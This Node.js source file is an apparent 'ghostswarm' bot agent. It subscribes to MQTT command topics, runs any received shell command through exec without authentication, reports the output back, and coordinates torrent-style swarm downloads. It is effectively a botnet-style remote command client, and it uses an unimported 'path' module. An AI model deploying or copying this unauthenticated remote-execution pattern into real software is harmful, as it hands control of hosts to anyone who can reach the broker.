const mqtt = require('mqtt');
const { exec } = require('child_process');

const MQTT_BROKER = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';

const fs = require("fs");
const { download } = require("./download.js"); // Ensure you have this package installed

let botId;
try {
   botId = fs.readFileSync("/host_hostname", "utf8").trim();
} catch {
   botId = require("os").hostname(); // fallback
}

console.log(`🤖 [${botId}] connecting to MQTT broker at ${MQTT_BROKER}`);
const mqttClient = mqtt.connect(MQTT_BROKER);

mqttClient.on('connect', () => {
   console.log(`🤖 [${botId}] connected to MQTT`);
   const topic = `ghostswarm/${botId}/command`;
   mqttClient.subscribe(topic, { qos: 1 }, (err) => {
      if (err) {
         console.error(`❌ [${botId}] failed to subscribe:`, err);
      } else {
         console.log(`📡 [${botId}] subscribed to ${topic}`);
      }
   });
   mqttClient.subscribe(`ghostswarm/download/#`);
   mqttClient.subscribe(`ghostswarm/torrent/have/#`);

});

mqttClient.on('message', (topic, message) => {

   try {
      if (topic == `ghostswarm/${botId}/command`) {
         const payload = JSON.parse(message.toString());
         console.log(`📥 [${botId}] received:`, payload);

         const statusTopic = `ghostswarm/${botId}/status`;

         // Handle different message types
         if (payload.type === 'shell' && payload.cmd) {
            // Execute shell command
            exec(payload.cmd, (err, stdout, stderr) => {
               mqttClient.publish(statusTopic, JSON.stringify({
                  requestId: payload.requestId,
                  output: err ? stderr || 'Command failed' : stdout.trim(),
                  status: err ? 'error' : 'ok',
                  time: Date.now()
               }));
               console.log(`📤 [${botId}] shell command executed and responded`);
            });
         } else {
            // General echo response for non-shell commands
            mqttClient.publish(statusTopic, JSON.stringify({
               received: payload,
               status: "ok",
               time: Date.now()
            }));
            console.log(`📤 [${botId}] responded to status`);
         }

      } else if (topic.startsWith('ghostswarm/download/')) {
         const infoHash = topic.split('/')[2];
         const payload = JSON.parse(message.toString());
         console.log(`📥 [${botId}] received torrent download request for ${infoHash}`, payload);
         handleTorrentDownload(infoHash, payload);
      }

      else if (topic.startsWith('ghostswarm/torrent/have/')) {
         const bot = topic.split('/')[3];
         const { infoHash, pieceIndex } = JSON.parse(message.toString());
         if (bot == botId) {
            return;
         }
         updateSwarmMap(infoHash, pieceIndex, bot);
      }
   } catch (err) {
      console.error(`❌ [${botId}] failed to handle message`, err);

      // Send error response
      const statusTopic = `ghostswarm/${botId}/status`;
      mqttClient.publish(statusTopic, JSON.stringify({
         status: "error",
         error: err.message,
         time: Date.now()
      }));
   }
});

function updateSwarmMap(infoHash, pieceIndex, who) {
   const swarmFile = path.join('/swarm', `${infoHash}.json`);
   fs.mkdirSync(path.dirname(swarmFile), { recursive: true });

   let map = {};
   if (fs.existsSync(swarmFile)) {
      map = JSON.parse(fs.readFileSync(swarmFile));
   }

   const key = pieceIndex.toString();
   if (!map[key]) map[key] = [];
   if (!map[key].includes(who)) map[key].push(who);

   fs.writeFileSync(swarmFile, JSON.stringify(map, null, 2));
   console.log(`🧠 Swarm updated: piece ${pieceIndex} held by ${who}`);
}

function handleTorrentDownload(infoHash, payload) {
   // save payload to file 
   const torrentPath = `torrents/${infoHash}.json`;
   fs.mkdirSync('torrents', { recursive: true }); // ensure directory exists
   fs.writeFileSync(torrentPath, JSON.stringify(payload, null, 2));
   console.log(`📂 [${botId}] saved torrent to ${torrentPath}`);
   // Download the torrent
   download(payload, infoHash, mqttClient)
      .then(() => {
         console.log(`📥 [${botId}] started downloading torrent ${infoHash}`);
      })
      .catch(err => {
         console.error(`❌ [${botId}] failed to download torrent ${infoHash}:`, err);
         // Send error response
         const statusTopic = `ghostswarm/${botId}/status`;
         mqttClient.publish(statusTopic, JSON.stringify({
            status: "error",
            error: err.message,
            time: Date.now()
         }));
      }
      );

}






function heartbeat() {
   const statusTopic = `ghostswarm/status/${botId}`;
   mqttClient.publish(statusTopic, JSON.stringify({
      status: "alive",
      time: Date.now()
   }));
   // console.log(`❤️ [${botId}] heartbeat sent`);
}

heartbeat(); // send initial heartbeat
setInterval(heartbeat, 15000); // send heartbeat every 15 seconds